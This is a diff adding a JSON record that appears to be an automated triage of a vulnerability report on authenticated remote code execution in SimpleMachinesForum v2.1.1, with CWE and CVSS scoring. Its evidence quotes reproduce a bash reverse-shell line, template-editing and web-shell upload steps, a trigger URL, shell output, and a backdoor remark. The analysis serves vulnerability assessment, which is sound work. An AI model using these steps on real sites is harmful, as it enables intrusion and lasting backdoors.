@@ -1,0 +1,73 @@
+{
+  "proposal": {
+    "is_vulnerability_report": true,
+    "summary": "Authenticated remote code execution in SimpleMachinesForum v2.1.1 via the admin theme/template editor and media upload, allowing an attacker with admin access to insert PHP webshell code and obtain a reverse shell; the author also claims the injected PHP can be executed without valid login.",
+    "affected_product": "SimpleMachinesForum v2.1.1",
+    "cwe": "CWE-94",
+    "cwe_quote": "Now add the vulnerable php reverse tcp web shell exec(\"/bin/bash -c 'bash -i >& /dev/tcp/192.168.56.1/4477 0>&1'\"); ?>",
+    "cvss": {
+      "AV": {
+        "value": "N",
+        "quote": "Visit http://IP_ADDR/index.php?action=admin;area=theme;b4c2510f=bc6cde24d794569356b81afc98ede2c2 and get the reverse shell:"
+      },
+      "AC": {
+        "value": "L",
+        "quote": ""
+      },
+      "PR": {
+        "value": "L",
+        "quote": "Step1- Login with Admin Credentials"
+      },
+      "UI": {
+        "value": "N",
+        "quote": "Now add the vulnerable php reverse tcp web shell exec(\"/bin/bash -c 'bash -i >& /dev/tcp/192.168.56.1/4477 0>&1'\"); ?>"
+      },
+      "S": {
+        "value": "U",
+        "quote": ""
+      },
+      "C": {
+        "value": "H",
+        "quote": "listening on [any] 4477 ...\nconnect to [192.168.56.1] from (UNKNOWN) [192.168.56.130] 41276\nbash: cannot set terminal process group (1334): Inappropriate ioctl for device\nbash: no job control in this shell\ndaemon@debian:/opt/bitnami/simplemachinesforum$ whoami\nwhoami\ndaemon"
+      },
+      "I": {
+        "value": "H",
+        "quote": "daemon@debian:/opt/bitnami/simplemachinesforum$ id\nid\nuid=1(daemon) gid=1(daemon) groups=1(daemon)"
+      },
+      "A": {
+        "value": "H",
+        "quote": "Now add the vulnerable php reverse tcp web shell exec(\"/bin/bash -c 'bash -i >& /dev/tcp/192.168.56.1/4477 0>&1'\"); ?>\n... and get the reverse shell:"
+      }
+    },
+    "recommended_next_step": "Verify and reproduce the issue on a test instance (v2.1.1), capture the exact code paths allowing template editing and media upload, determine whether admin authentication is required for execution, and apply patches or disable template/file editing and arbitrary PHP uploads until fixed.",
+    "confidence": "high",
+    "evidence_quotes": [
+      {
+        "claim": "Authenticated admin steps to insert PHP",
+        "quote": "Step1- Login with Admin Credentials\n#Step2- Goto Admin=>Main=>Administration Center=>Configuration=>Themes and Layout=>Modify Themes=>Browse the templates and files in this theme.=>Admin.template.php\n#Step3- Now add the vulnerable php reverse tcp web shell exec(\"/bin/bash -c 'bash -i >& /dev/tcp/192.168.56.1/4477 0>&1'\"); ?>"
+      },
+      {
+        "claim": "Upload php web shell via Add Media and save changes",
+        "quote": "Step4- Now Goto Add Media=>Add Resource=> Upload php web shell and click on SAVE CHANGES at the bottom of the page"
+      },
+      {
+        "claim": "Visiting URL triggers reverse shell",
+        "quote": "Visit http://IP_ADDR/index.php?action=admin;area=theme;b4c2510f=bc6cde24d794569356b81afc98ede2c2 and get the reverse shell:"
+      },
+      {
+        "claim": "Interactive shell and commands showing compromise",
+        "quote": "listening on [any] 4477 ...\nconnect to [192.168.56.1] from (UNKNOWN) [192.168.56.130] 41276\nbash: cannot set terminal process group (1334): Inappropriate ioctl for device\nbash: no job control in this shell\ndaemon@debian:/opt/bitnami/simplemachinesforum$ whoami\nwhoami\ndaemon\ndaemon@debian:/opt/bitnami/simplemachinesforum$ id\nid\nuid=1(daemon) gid=1(daemon) groups=1(daemon)"
+      },
+      {
+        "claim": "Author claims injected php can be executed without login",
+        "quote": "Note- Once we insert the vulnerable php code, we can even execute it without any valid login as it is not required! We can use it as a backdoor!"
+      }
+    ]
+  },
+  "usage": {
+    "input_tokens": 2056,
+    "output_tokens": 1125,
+    "latency_s": null,
+    "batch": true
+  }
+}
